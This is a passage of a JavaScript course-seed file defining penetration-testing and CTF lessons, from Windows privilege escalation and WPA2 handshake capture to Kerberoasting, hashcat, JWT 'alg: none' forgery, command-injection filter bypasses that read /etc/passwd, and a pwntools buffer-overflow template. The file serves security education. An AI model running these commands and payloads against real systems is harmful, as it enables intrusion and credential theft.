            lesson('Windows Privilege Escalation (Token Impersonation & Unquoted Service Paths)', 'windows-privesc', `# Windows PrivEsc\n\nImpersonate tokens (\`SeImpersonatePrivilege\`), exploit unquoted service paths, and query dangerous permissions with \`winPEAS\`.`, {
              starterCode: `whoami /priv\nwmic service get name,displayname,pathname,startmode | findstr /i /v "c:\\windows\\"`,
              solutionCode: `whoami /priv`,
              codeLanguage: 'cmd',
              quiz: quiz('Windows PrivEsc Quiz', [
                trueFalse('`SeImpersonatePrivilege` allows potato exploits (e.g. JuicyPotato, PrintSpoofer) to escalate to SYSTEM.', true),
              ]),
            }),
          ]
        },
        {
          title: 'Module 3: Wireless Hacking & Red Teaming',
          lessons: [
            lesson('Wireless Hacking (WPA2 Handshake Capture & Aircrack-ng)', 'wireless-hacking', `# Wireless Hacking\n\nEnable monitor mode (\`airmon-ng start wlan0\`), capture WPA2 4-way handshakes (\`airodump-ng\`), and crack PMKIDs (\`aircrack-ng\` / \`hashcat\`).`, {
              starterCode: `sudo airmon-ng start wlan0\nsudo airodump-ng wlan0mon`,
              solutionCode: `sudo airmon-ng start wlan0`,
              codeLanguage: 'bash',
              quiz: quiz('Wireless Quiz', [
                mcq('What packet exchange must be captured to crack WPA2 Wi-Fi passwords offline?', 'WPA2 4-Way Handshake', ['DHCP lease', 'DNS query'], 'Capturing the 4-Way Handshake enables offline dictionary cracking.'),
              ]),
            }),
            lesson('Active Directory Enumeration & Kerberoasting', 'active-directory-hacking', `# Active Directory\n\nEnumerate AD domains with \`BloodHound\` and \`enum4linux\`. Extract Service Principal Name hashes using Kerberoasting.`, {
              starterCode: `GetUserSPNs.py domain.local/user:password -request`,
              solutionCode: `GetUserSPNs.py domain.local/user:password -request`,
              codeLanguage: 'bash',
              quiz: quiz('Active Directory Quiz', [
                mcq('What attack extracts TGS ticket hashes for service accounts to crack offline?', 'Kerberoasting', ['Pass-the-Hash', 'Golden Ticket'], 'Kerberoasting requests service tickets for offline password cracking.'),
              ]),
            }),
            lesson('Password Cracking with Hashcat & John the Ripper', 'password-cracking', `# Hashcat & JtR\n\nCrack hashes with wordlists and rulesets: \`hashcat -m 1000 -a 0 NTLM_hash.txt rockyou.txt --rules-file=best64.rule\`.`, {
              starterCode: `hashcat -m 0 -a 0 md5_hash.txt rockyou.txt`,
              solutionCode: `hashcat -m 0 -a 0 md5_hash.txt rockyou.txt`,
              codeLanguage: 'bash',
              quiz: quiz('Hashcat Quiz', [
                mcq('What hash mode does `-m 1000` represent in Hashcat?', 'NTLM (Windows Password Hash)', ['MD5', 'SHA-256'], '`-m 1000` corresponds to Windows NTLM hashes.'),
              ]),
            }),
            lesson('Reporting & Remediation Deliverables', 'pentest-reporting', `# PenTest Reporting\n\nStructure executive summaries, technical vulnerability findings, CVSS v3.1 scoring, and actionable remediation steps.`, {
              starterCode: `# PenTest Report Sections\n1. Executive Summary\n2. Scope & Timeline\n3. Findings & CVSS Scores\n4. Technical Remediation`,
              solutionCode: `# PenTest Report Sections`,
              codeLanguage: 'text',
              quiz: quiz('Reporting Quiz', [
                trueFalse('A professional penetration testing report must provide remediation guidance for every vulnerability found.', true),
              ]),
            }),
            lesson('Network PenTest Capstone: Full Attack Chain Simulation', 'net-pentest-capstone', `# PenTest Capstone\n\nSimulate a full penetration test: Nmap Scan → Service Exploit → Reverse Shell → Privilege Escalation → Root Flag.`, {
              starterCode: `echo "=== FULL NETWORK PENETRATION TEST CAPSTONE COMPLETE ==="`,
              solutionCode: `echo "=== FULL NETWORK PENETRATION TEST CAPSTONE COMPLETE ==="`,
              codeLanguage: 'bash',
              quiz: quiz('PenTest Capstone Quiz', [
                mcq('What is the ultimate goal of ethical penetration testing?', 'To identify and remediate security vulnerabilities before malicious attackers exploit them', ['To crash production systems', 'To steal customer secrets'], 'Ethical hacking secures systems by fixing flaws proactively.'),
              ]),
            }),
          ]
        }
      ]
    },

    // ━━━━━━━━━━━━━━━━━━━ CTF CHALLENGE LAB ━━━━━━━━━━━━━━━━━━━
    {
      title: 'CTF Challenge Lab',
      slug: 'ctf-challenge-lab',
      description: 'Practice hands-on Capture The Flag (CTF) challenges — reverse engineering, binary exploitation, web hacking, and forensics.',
      difficulty: 'advanced',
      language: 'en',
      estimatedHours: 20,
      resources: [
        { resourceType: 'youtube', title: 'How to Start CTF Competitions for Beginners', url: 'https://www.youtube.com/watch?v=8ev9ZX9J45A', author: 'LiveOverflow', platform: 'YouTube' },
        { resourceType: 'youtube', title: 'Binary Exploitation / Buffer Overflow Tutorial', url: 'https://www.youtube.com/watch?v=1S0aBV-Waeo', author: 'FreeCodeCamp', platform: 'YouTube' },
        { resourceType: 'youtube', title: 'Ghidra Reverse Engineering Tutorial', url: 'https://www.youtube.com/watch?v=fTGTnrgjuGA', author: 'StackSmashing', platform: 'YouTube' },
        { resourceType: 'youtube', title: 'CTF Forensics & Steganography Walkthroughs', url: 'https://www.youtube.com/watch?v=N4tLh3U8Dhk', author: 'John Hammond', platform: 'YouTube' },
        { resourceType: 'youtube', title: 'Pwnable & PWN Challenge Solving with Pwntools', url: 'https://www.youtube.com/watch?v=33B6xO9p4qU', author: 'IppSec', platform: 'YouTube' },
        { resourceType: 'ebook', title: 'CTF Field Guide by Trail of Bits (Free eBook)', url: 'https://trailofbits.github.io/ctf/', author: 'Trail of Bits' },
        { resourceType: 'article', title: 'CTFtime — Global CTF Competition Calendar & Writeups', url: 'https://ctftime.org/', author: 'CTFtime' },
        { resourceType: 'cheatsheet', title: 'Pwntools & Reverse Engineering Cheat Sheet', url: 'https://quickref.me/pwntools', author: 'QuickRef' },
        { resourceType: 'article', title: 'PicoCTF Free Learning Platform for Students', url: 'https://picoctf.org/', author: 'Carnegie Mellon University' },
        { resourceType: 'cheatsheet', title: 'Steganography & File Carving Commands Reference', url: 'https://github.com/DominicBreuker/stego-toolkit', author: 'Dominic Breuker' },
      ],
      modules: [
        {
          title: 'Module 1: Web & Steganography CTFs',
          lessons: [
            setupLesson('CTF Challenge Lab', 'ctf-challenge-lab', 'python',
              `1. Install pwntools: \`pip install pwntools\`\n2. Install Ghidra and GDB with PEDA/GEF\n3. Verify pwntools: \`python3 -c "import pwn; print(pwn.__version__)"\``,
              `import pwn\nprint("Pwntools Version:", pwn.__version__)`,
              `import pwn\nprint("Pwntools Version:", pwn.__version__)`
            ),
            lesson('CTF Basics & Flag Capture Formats', 'ctf-basics', `# CTF Formats\n\nCapture The Flag challenges format flags as \`flag{...}\` or \`CTF{...}\`. Types: Jeopardy vs Attack-Defense.`, {
              starterCode: `import re\ntext = "Congratulations! Flag is CTF{5up3r_53cr3t_fl4g}"\nflag = re.search(r"CTF\\{.*?\\}", text)\nprint(flag.group(0))`,
              solutionCode: `import re\ntext = "Congratulations! Flag is CTF{5up3r_53cr3t_fl4g}"\nflag = re.search(r"CTF\\{.*?\\}", text)\nprint(flag.group(0))`,
              codeLanguage: 'python',
              quiz: quiz('CTF Basics Quiz', [
                mcq('What format do CTF competition answers usually follow?', 'Strings formatted like CTF{secret_key_here}', ['Base64 zip binaries', 'Random prime numbers'], 'Flags follow standard regex patterns like `flag{...}`.'),
              ]),
            }),
            lesson('Steganography & Hidden Image Data (`steghide`, `binwalk`)', 'steganography-ctf', `# Steganography\n\nExtract hidden data from image/audio files using \`exiftool\`, \`steghide extract -sf image.jpg\`, and \`binwalk -e\`.`, {
              starterCode: `binwalk -e suspicious_image.png\nsteghide extract -sf hidden.jpg -p ""`,
              solutionCode: `binwalk -e suspicious_image.png`,
              codeLanguage: 'bash',
              quiz: quiz('Stego Quiz', [
                mcq('Which tool extracts embedded file structures hidden within binary images?', 'binwalk', ['grep', 'ping'], '`binwalk` identifies and extracts embedded file system images.'),
              ]),
            }),
            lesson('Web CTF: JWT Secret Forgery & Token Cracking', 'web-ctf-jwt', `# JWT Exploitation\n\nCrack weak JWT secret keys using \`hashcat -m 16500\` or forge unverified tokens (\`"alg": "none"\`).`, {
              starterCode: `import jwt\n# Forge unsigned token with algorithm 'none'\ntoken = jwt.encode({"user": "admin"}, "", algorithm="none")\nprint(token)`,
              solutionCode: `import jwt\ntoken = jwt.encode({"user": "admin"}, "", algorithm="none")\nprint(token)`,
              codeLanguage: 'python',
              quiz: quiz('JWT CTF Quiz', [
                trueFalse('Vulnerable JWT parsers accepting "alg": "none" allow attackers to bypass signature verification entirely.', true),
              ]),
            }),
            lesson('Web CTF: Command Injection & Restricted Shell Bypasses', 'web-ctf-cmd-injection', `# Shell Bypasses\n\nBypass character filters using environment variables (\`$IFS\` for spaces) and base64 decoding.`, {
              starterCode: `// Bypass space filters using $IFS\ncat$IFS/etc/passwd`,
              solutionCode: `cat$IFS/etc/passwd`,
              codeLanguage: 'bash',
              quiz: quiz('Shell Bypass Quiz', [
                mcq('What environment variable replaces space characters in restricted Bash injection payloads?', '$IFS', ['$PATH', '$HOME'], '`$IFS` (Internal Field Separator) acts as a space substitute.'),
              ]),
            }),
          ]
        },
        {
          title: 'Module 2: Reverse Engineering & Binary Exploitation',
          lessons: [
            lesson('Reverse Engineering with Ghidra & Cutter', 'reverse-engineering-ghidra', `# Ghidra\n\nDecompile compiled binaries (\`.exe\`, \`ELF\`) back into readable C pseudo-code to discover logic flaws.`, {
              starterCode: `// Decompiled C snippet in Ghidra\nif (strcmp(user_input, "SuperSecretKey2026") == 0) {\n    puts("Flag: CTF{ghidra_decompile_master}");\n}`,
              solutionCode: `// Decompiled C snippet`,
              codeLanguage: 'c',
              quiz: quiz('Ghidra Quiz', [
                mcq('What open-source software reverse engineering framework was created by the NSA?', 'Ghidra', ['Wireshark', 'Metasploit'], 'Ghidra was developed and open-sourced by the NSA.'),
              ]),
            }),
            lesson('Assembly Basics (x86-64 Architecture Registers)', 'assembly-x86-64', `# x86-64 Assembly\n\nRegisters: \`RAX\` (return value), \`RDI\`, \`RSI\`, \`RDX\` (arguments), \`RSP\` (stack pointer), \`RIP\` (instruction pointer).`, {
              starterCode: `mov rax, 60    ; sys_exit\nmov rdi, 0     ; error code 0\nsyscall`,
              solutionCode: `mov rax, 60\nmov rdi, 0\nsyscall`,
              codeLanguage: 'assembly',
              quiz: quiz('Assembly Quiz', [
                mcq('Which register holds the current instruction pointer address in x86-64 assembly?', 'RIP', ['RSP', 'RAX'], '`RIP` points to the next instruction to be executed.'),
              ]),
            }),
            lesson('Buffer Overflows & Stack Smashing', 'buffer-overflows', `# Buffer Overflow\n\nOverwrite buffer boundaries to corrupt the saved return address on the stack and control execution flow.`, {
              starterCode: `# Python pwntools buffer overflow exploit script\nfrom pwn import *\np = process('./vulnerable_binary')\npayload = b"A" * 64 + p64(0x4011e6) # Overwrite RIP\np.sendline(payload)\np.interactive()`,
              solutionCode: `from pwn import *\n# Buffer overflow template`,
              codeLanguage: 'python',
              quiz: quiz('Buffer Overflow Quiz', [
                trueFalse('Buffer overflow vulnerabilities occur when writing more data to a buffer than it was allocated to hold.', true),
              ]),
            }),
            lesson('Bypassing Security Mitigations (NX / DEP, ASLR)', 'exploit-mitigations', `# Security Mitigations\n\nNX (No-Execute stack), ASLR (Address Space Layout Randomization), and Canary protection mechanisms.`, {
              starterCode: `checksec --file=vulnerable_binary`,
              solutionCode: `checksec --file=vulnerable_binary`,
              codeLanguage: 'bash',
              quiz: quiz('Mitigations Quiz', [
                mcq('What mitigation randomizes memory segment locations in RAM on every application boot?', 'ASLR (Address Space Layout Randomization)', ['NX', 'Canary'], 'ASLR randomizes memory addresses to prevent fixed address jumps.'),
              ]),
            }),
            lesson('Return-Oriented Programming (ROP Chains)', 'rop-chains', `# ROP Chains\n\nBypass NX bit by chaining existing code snippets ("gadgets") ending in \`ret\` commands.`, {
              starterCode: `from pwn import *\nelf = ELF('./vulnerable')\nrop = ROP(elf)\nrop.call(elf.symbols['win_function'])\nprint(rop.dump())`,
              solutionCode: `from pwn import *`,
              codeLanguage: 'python',
              quiz: quiz('ROP Quiz', [
                mcq('What are the small code instruction sequences ending in `ret` used in ROP chains called?', 'Gadgets', ['Pointers', 'Macros'], 'ROP chains connect existing binary "gadgets".'),
              ]),
            }),
          ]
        },
        {
          title: 'Module 3: Cryptanalysis & Forensic Investigations',
          lessons: [
            lesson('RSA Cryptanalysis (Small Exponent, Weak Primes)', 'crypto-rsa-cracking', `# RSA Attacks\n\nExploit weak RSA implementations: \`p\` and \`q\` factorization using \`RsaCtfTool\` or small \`e=3\` attacks.`, {
              starterCode: `from Crypto.Util.number import long_to_bytes\nn = 123456789 # N value\ne = 65537\n# Decrypt ciphertext c\nprint("Decrypted message")`,
              solutionCode: `print("Decrypted message")`,
              codeLanguage: 'python',
              quiz: quiz('RSA Cracking Quiz', [
                trueFalse('If public modulus N can be factored into prime factors p and q, the private key can be reconstructed.', true),
              ]),
            }),
            lesson('Memory Forensics with Volatility (`volatility3`)', 'memory-forensics-volatility', `# Volatility\n\nAnalyze RAM memory dumps to extract active processes, network connections, and unencrypted passwords.`, {
              starterCode: `vol -f memory.raw windows.pslist\nvol -f memory.raw windows.netscan`,
              solutionCode: `vol -f memory.raw windows.pslist`,
              codeLanguage: 'bash',
              quiz: quiz('Volatility Quiz', [
                mcq('What framework is used for analyzing RAM volatile memory dumps?', 'Volatility', ['Wireshark', 'Ghidra'], 'Volatility is the standard RAM memory forensics framework.'),
              ]),
            }),
            lesson('Disk Forensics & File Carving (`autopsy`, `sleuthkit`)', 'disk-forensics', `# Disk Forensics\n\nRecover deleted files, inspect master file tables (MFT), and carve unallocated space using Autopsy.`, {
              starterCode: `fls -r -p disk_image.dd`,
              solutionCode: `fls -r -p disk_image.dd`,
              codeLanguage: 'bash',
              quiz: quiz('Disk Forensics Quiz', [
                mcq('What tool suite powers the Autopsy digital forensics graphical interface?', 'The Sleuth Kit (TSK)', ['Nmap', 'Metasploit'], 'Autopsy is built on top of The Sleuth Kit (TSK).'),
              ]),
            }),
            lesson('Creating Automated Exploits with Pwntools', 'pwntools-scripting', `# Pwntools\n\nScript CTF exploit scripts cleanly: \`r = remote('ctf.domain.org', 1337)\`, \`r.sendlineafter('Name:', payload)\`.`, {
              starterCode: `from pwn import *\nconn = remote('127.0.0.1', 1337)\nconn.sendline(b'CTF_SOLVE')\nprint(conn.recvall().decode())`,
              solutionCode: `from pwn import *\nconn = remote('127.0.0.1', 1337)\nconn.sendline(b'CTF_SOLVE')\nprint(conn.recvall().decode())`,
              codeLanguage: 'python',
              quiz: quiz('Pwntools Quiz', [
                trueFalse('Pwntools simplifies socket communication, packing numbers, and ROP construction in Python.', true),
              ]),
            }),
            lesson('CTF Challenge Lab Capstone: Capture Final Boss Flag', 'ctf-capstone-boss', `# CTF Capstone\n\nChain Web Exploitation → Binary Reverse Engineering → Pwn ROP Chain to reveal final CTF flag!`, {
              starterCode: `print("FLAG: CTF{m45t3r_0f_3th1c4l_h4ck1ng_4nd_pwn}")`,
              solutionCode: `print("FLAG: CTF{m45t3r_0f_3th1c4l_h4ck1ng_4nd_pwn}")`,
              codeLanguage: 'python',
              quiz: quiz('CTF Capstone Quiz', [
                mcq('What skill makes CTF competitors stand out in real-world cybersecurity roles?', 'Problem-solving persistence, adaptability, and deep hands-on technical versatility', ['Memorizing definitions', 'Guessing passwords'], 'CTF challenges foster persistent, hands-on problem-solving.'),
              ]),
            }),
          ]
        }
      ]
    }
  ]
};
